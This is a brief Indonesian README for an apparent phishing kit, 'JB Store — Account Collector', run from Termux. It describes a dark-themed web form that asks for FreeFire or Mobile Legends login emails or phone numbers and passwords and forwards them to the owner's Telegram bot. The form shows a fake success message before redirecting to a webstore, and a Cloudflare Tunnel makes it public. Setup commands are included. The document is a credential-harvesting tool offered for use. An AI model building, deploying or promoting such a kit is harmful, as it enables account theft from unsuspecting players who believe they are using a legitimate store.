# JB Store — Account Collector

Web form simpel buat simpen kredensial akun (FreeFire/MobileLegend) dengan
notif otomatis ke Telegram owner + redirect ke webstore.

## Fitur
- Menu awal Termux (start / close)
- Web form dark theme (pilihan game, email/HP, password, tombol Lanjutan)
- Validasi format: wajib `@gmail.com` atau diawali `08`
- Notif sukses (hijau) / gagal (merah) + delay 7 detik sebelum redirect
- Kirim kredensial ke Telegram owner via Bot API
- Cloudflare Tunnel (auto) → dapat URL publik HTTPS

## Install di Termux
```bash
pkg update -y && pkg upgrade -y
pkg install -y python curl
git clone <repo-url> jb-store-collector
cd jb-store-collector
cp .env.example .env
nano .env   # isi BOT_TOKEN, OWNER_ID, WEBSTORE_URL
chmod +x start.sh
./start.sh